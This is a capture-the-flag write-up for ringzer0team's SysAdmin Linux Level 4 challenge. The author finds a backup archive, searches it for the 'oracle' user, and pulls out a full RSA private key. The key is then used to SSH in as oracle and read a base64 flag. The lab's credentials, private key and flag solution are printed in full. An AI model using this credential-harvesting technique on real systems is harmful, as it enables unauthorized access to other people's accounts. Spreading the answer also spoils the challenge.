# ringzer0team.com -- SysAdmin Linux -- Level 4

## 1. Challenge

> Get access to the oracle account.   
>   
> User: morpheus  
> Password: VNZDDLq2x9qXCzVdABbR1HOtz  

Please connect to via SSH:

```bash
$ ssh morpheus@challenges.ringzer0team.com -p 10146
```

## 2. Solution

In root directory:

```bash
morpheus@lxc-sysadmin:/$ ls
backup  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

You can see there is a `backup` folder.

```bash
morpheus@lxc-sysadmin:/$ cd backup/
morpheus@lxc-sysadmin:/backup$ ls
3dab3277410dddca016834f91d172027  c074fa6ec17bb35e168366c43cf4cd19
776d27d2a429e63bbc3cb29183417bb2  ca584b15ae397a9ad45b1ff267b55796
morpheus@lxc-sysadmin:/backup$ grep "oracle" -R ./ 2>/dev/null
Binary file ./c074fa6ec17bb35e168366c43cf4cd19 matches
```

It seems that `c074fa6ec17bb35e168366c43cf4cd19` contains something about oracle.

```bash
morpheus@lxc-sysadmin:/backup$ cat c074fa6ec17bb35e168366c43cf4cd19
...
...
home/oracle/.ssh/id_rsa                                                                             0000600 0001750 0001750 00000003217 12310211305 016007  0                                                                                   ustar   chamilton                       chamilton                                                                       
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqBIMY0jPs4dvQqsyHreYccCOIMFrBy+el5Td8TNc8pQqINNr
WSefxANe4b0EaAZofvZbBGrHipyB6X+FgugXYqwB0uem06uTGnIdHAZyHV6IE9f/
hLCm+9nWOJfUvPNFbMaIizvzMVhO6GTGyxJ8zh/ASQXYBHSzyOxkmqDLB7zFteyJ
F7hv6s6W20TmpjhMQtOC0mYwn64ZCsVi2d1c7tFiw37cOutT1LfZaaAUBIwdpvL6
BFjqpNkxzwm105eFTDt4WZNKOZ9nOns18MHBHFOXk8WgAxC6gqtE2gr7cTBZsbwv
jXrte8oTtAWCv3YHSECH91NzE3DKVktCwr1bjQIDAQABAoIBAQCdefu9c1WZY4bu
MrYNbf0aaE9Dhbcgzo+Me+HQxE2MxSMMCsyEhsn9wSK/5Hkidw6mF3KEmwBIcgiP
nfqdA5YV0BENahw4LITyvIVl4uw9dHuQDEzQKSzswdkkwa6FNHOSThtWSl+9ln6o
5PQXBkWGZN2oDh+vXSGvWz+QWqSho8vufmTtYntfFPAfVfcyp8BtiUgKQh069uGg
XKnehmkrHoW9gQ2Lo0uaFWcTIGm1vsgBd7L4cfb98jDB63H+Lhf4UPYv4WmH2rrj
bnk5lAU71JK4QsPnnOx1PA685p2e5mEfh0LKRKq9Fx3+umbGPJGvgcjobtXaW9OT
mpaz6ZPBAoGBAM+diN8s/osQdi8odS9+HUWVZBa9Z2Dn0X2IlSxWK9u/UclhjYgP
i2KXEY0wRV+ZiXURmrFNVxgA/EJ9BOgptSZNmi9fEdfnVB4L11T7HFny/J8u3sXt
dn0OqHmf5ZEPtV7m0bK0jtznTgTTuBI9yXvRgHO2HQPCshdP7GIgt++lAoGBAM89
Pd7HyMYnh0ancCTICkVIIWF6Ylf20BKz4Zwy9tYASCxY3iFllBdOXw/UgCnmJseQ
73Dcimi5OEyUckOp7xX4HTwidFVbxfNeC0ZfsPbd22qSDcw5orpQMoDy3iP+bPJh
SgwtusqotGjm0jTpnhqRV5x6rchzkMYwF8/WkvfJAoGBAMeem6yh0XiaclfzWYE5
jCGMezjWEeD949IEkhGYJQFbmeK79l49O/KmeAy9veYmdSDntUoGp9f/kozHMgGb
oH5cnQQxL7HczWc6UWd3LhJabIUNhsreAFBL2Ldgg1UPun6uBjACJV7G06AWhWSc
ne58SDp5frpP5/Y8NXdAKDq1AoGAYCSFQ4lj96n29CxRtn6nZSTld5eTcEOsnECf
dhuesAFJemlwBAZgAb/2Eh3/p3CCpSr0KmPmQldLaxujNwjrRkHpLjC9z6vX1ePX
TzqtmpmqZXKEvC4w9EaoZ3JE5GXwnTHNbID6m3JQ4CnVc36+Po0XHB096jTTAV7m
bSGa5SECgYBE2IuW1pk2pOZ+FDtKltWHk8KK89QmGsFf2YnVZ/FsAkPnayeTkmMz
AWxRP/W/Uj5ypw7KjprQee31hkisBG/ZPBvQdjAvxF7m4usuEN2Nkb0FTIjZHYbD
iPOmPHIUlwwL8UVzDQUzXhegSB4GUeP/06T/eM5PPB8SX0ZaHIw1wQ==
-----END RSA PRIVATE KEY-----

...
...

home/oracle/.ssh/id_rsa.pub                                                                         0000640 0001750 0001750 00000000616 12310211305 016600  0                                                                                   ustar   chamilton                       chamilton                                                                       ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoEgxjSM+zh29CqzIet5hxwI4gwWsHL56XlN3xM1zylCog02tZJ5/EA17hvQRoBmh+9lsEaseKnIHpf4WC6BdirAHS56bTq5Mach0cBnIdXogT1/+EsKb72dY4l9S880VsxoiLO/MxWE7oZMbLEnzOH8BJBdgEdLPI7GSaoMsHvMW17IkXuG/qzpbbROamOExC04LSZjCfrhkKxWLZ3Vzu0WLDftw661PUt9lpoBQEjB2m8voEWOqk2THPCbXTl4VMO3hZk0o5n2c6ezXwwcEcU5eTxaADELqCq0TaCvtxMFmxvC+Neu17yhO0BYK/dgdIQIf3U3MTcMpWS0LCvVuN oracle@forensics

...
...
```

Though it is a little mess, but you can see there is an RSA private key and seems to be the content of `/home/oracle/.ssh/id_rsa`.

So let's use this RSA key to log in as oracle.

```bash
$ vim key.pem

<Save the RSA private key as key.pem file>

$ chmod 400 key.pem
$ ssh -i key.pem oracle@challenges.ringzer0team.com -p 10146
...
...
oracle@lxc-sysadmin:~$ ls
encflag.txt.enc  flag.txt
oracle@lxc-sysadmin:~$ cat flag.txt
RkxBRy1HSUdzMVdxNlY2U3NaOWg0YVFncEdnZGJkUAo=

```

Please use python to decode this base64 blob and you will see the flag:

```python
import base64
print(base64.b64decode('RkxBRy1HSUdzMVdxNlY2U3NaOWg0YVFncEdnZGJkUAo=').decode())
```

